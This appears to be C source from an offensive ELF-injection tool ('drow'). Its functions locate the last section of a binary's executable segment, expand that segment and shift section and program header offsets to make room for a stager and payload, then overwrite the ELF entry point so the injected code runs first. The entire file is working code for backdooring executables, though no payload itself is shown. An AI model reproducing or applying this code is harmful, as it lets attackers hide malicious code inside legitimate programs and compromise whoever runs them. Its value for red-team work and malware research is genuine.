#include <stdbool.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <elf.h>
#include <unistd.h>
#include "elf_patch.h"
#include "drow.h"

#define PAGE_SIZE 0x1000
#define ALIGN_PAGE(val) (val & ~(PAGE_SIZE -1))

extern uint8_t *g_stager;
extern uint8_t *g_stager_end;

bool expand_section(fmap_t *elf, struct shinfo *sinfo, struct tgt_info *tinfo, size_t patch_size)
{
    Elf64_Ehdr *ehdr;
    size_t size;
    uint32_t newoff;
    Elf64_Shdr *shtable;
    size_t i;
    uint32_t stager_size;

    stager_size = (uintptr_t)&g_stager_end - (uintptr_t)&g_stager;
    if (sinfo->inject_method == METHOD_EXPAND_AND_INJECT)
        patch_size = (ALIGN_PAGE(patch_size)) + PAGE_SIZE;

    ehdr = (Elf64_Ehdr *)elf->data;

    /* Set patch information */
    size = *sinfo->size;
    tinfo->base = *sinfo->offset + size;
    tinfo->size = patch_size;

    /* Fix up size */
    printf(INFO "Expanding %s size by %lu bytes...\n", sinfo->name, patch_size+stager_size);
    *sinfo->size = size + patch_size + stager_size;

    /* Only adjust section header offsets if we're expanding the segment past the page boundary */
    if (sinfo->inject_method == METHOD_EXPAND_AND_INJECT) {
        printf(INFO "Adjusting Section Header offsets ...\n");
        shtable = (Elf64_Shdr *)((uintptr_t)elf->data + ehdr->e_shoff);
        for (i = 0; i < ehdr->e_shnum; i++) {
            if (shtable[i].sh_offset < tinfo->base)
                continue;
            newoff = shtable[i].sh_offset + patch_size + stager_size;
            shtable[i].sh_offset = newoff;
        }
    }

    Elf64_Phdr *phdr = (Elf64_Phdr *)((uintptr_t)elf->data + ehdr->e_phoff);
    printf(INFO "Adjusting Program Headers ...\n");
    for (i = 0; i < ehdr->e_phnum; i++) {
        /* Only adjust program header offsets if we're expanding the segment past the page boundary */
        if (sinfo->inject_method == METHOD_EXPAND_AND_INJECT) {
            if (phdr[i].p_offset > tinfo->base) {
                phdr[i].p_offset = phdr[i].p_offset + patch_size + stager_size;
            }
        }

        if (phdr[i].p_flags & PF_X) {
            printf(INFO "Adjusting RX segment program header size ...\n");
            phdr[i].p_filesz += patch_size + stager_size;
            phdr[i].p_memsz += patch_size + stager_size;
        }
    }

    printf(INFO "Adjusting ELF header offsets ...\n");
    if (ehdr->e_shoff > tinfo->base)
        ehdr->e_shoff = ehdr->e_shoff + patch_size + stager_size;

    if (ehdr->e_phoff > tinfo->base)
        ehdr->e_phoff = ehdr->e_phoff + patch_size + stager_size;

    return true;
}

struct shinfo *find_exe_seg_last_section(fmap_t *elf, size_t patch_size)
{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shtable;
    char *shstr;
    uint32_t segment_end;
    struct shinfo *sinfo = NULL;
    size_t i, j;
    uint32_t stager_size;

    ehdr = (Elf64_Ehdr *)elf->data;
    phdr = (Elf64_Phdr *)((uintptr_t)elf->data + ehdr->e_phoff);
    shtable = (Elf64_Shdr *)((uintptr_t)elf->data + ehdr->e_shoff);
    shstr = (char *)((uintptr_t)elf->data + shtable[ehdr->e_shstrndx].sh_offset);

    for (i = 0; i < ehdr->e_phnum; i++) {
        if (!(phdr[i].p_flags & PF_X))
            continue;

        printf(SUCCESS "Found executable segment at 0x%08lx (size:%08lx)\n", phdr[i].p_offset, phdr[i].p_memsz);
        /* Found the executable segment, now find the last section in the segment */
        segment_end = phdr[i].p_vaddr + phdr[i].p_memsz;
        for (j = 0; j < ehdr->e_shnum; j++) {
            if (shtable[j].sh_addr + shtable[j].sh_size == segment_end) {
                sinfo = (struct shinfo *)malloc(sizeof(*sinfo));
                if (!sinfo) {
                    fprintf(stderr, ERR "Out of memory!?");
                    return NULL;
                }

                strncpy(sinfo->name, shstr+shtable[j].sh_name, MAX_SH_NAMELEN-1);
                sinfo->offset     = (uint32_t *)&shtable[j].sh_offset;
                sinfo->size       = (uint32_t *)&shtable[j].sh_size;
                break;
            }
        }
        printf(SUCCESS "Found %s at 0x%08x with a size of %u bytes\n", sinfo->name, *sinfo->offset, *sinfo->size);

        /* Check if the payload is able to fit without expanding the segment past the next page boundary */
        stager_size = (uintptr_t)&g_stager_end - (uintptr_t)&g_stager;
        if (shtable[j+1].sh_addr - shtable[j].sh_addr+shtable[j].sh_size >= patch_size+stager_size) {
            printf(INFO "Payload can fit on last page of RX segment\n");
            sinfo->inject_method = METHOD_LAST_PAGE_INJECT;
            goto out;
        }

        /* Check if it's the last segment in the binary */
        if (j+1 == ehdr->e_shnum) {
            sinfo->inject_method = METHOD_EXPAND_AND_INJECT;
            printf(INFO "RX segment is last segment in binary. You can inject any sized payload!\n");
            goto out;
        }

        /* Check if there's enough space to expand the segment */
        if ((shtable[j].sh_addr + PAGE_SIZE) > shtable[j+1].sh_addr) {
            sinfo->inject_method = METHOD_EXPAND_AND_INJECT;
            printf(ERR "RX segment can not accomodate payload of size %lu bytes (not enough space)\n", patch_size);
            return NULL;
        }
    }
    printf(ERR "RX segment not found!?\n");
out:
    return sinfo;
}

void patch_entry(fmap_t *elf, struct tgt_info *tinfo, uint32_t *old_entry)
{
    Elf64_Ehdr *ehdr;
    printf(INFO "Modifying ELF e_entry to point to the patch at 0x%08x ...\n", tinfo->base);
    ehdr = (Elf64_Ehdr *)elf->data;
    *old_entry = ehdr->e_entry;
    ehdr->e_entry = (uint32_t)tinfo->base;
}
